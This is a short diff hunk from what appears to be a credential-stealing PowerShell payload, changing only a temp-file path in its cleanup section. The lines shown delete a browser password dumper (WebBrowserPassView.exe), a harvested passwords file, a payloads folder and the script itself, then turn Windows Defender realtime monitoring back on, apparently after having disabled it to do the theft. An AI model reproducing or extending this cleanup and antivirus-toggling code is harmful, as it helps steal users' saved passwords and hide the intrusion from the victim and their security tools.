@@ -44,7 +44,7 @@ Remove-Item WebBrowserPassView.exe
 Remove-Item passwords-$env:UserName$random.txt
 cd..
 Remove-Item payloads
-Remove-Item C:\Users\$env:UserName\appdata\local\temp\passview.ps1
+Remove-Item $env:temp\passview.ps1
 
 Set-MpPreference -DisableRealtimeMonitoring 0
 exit
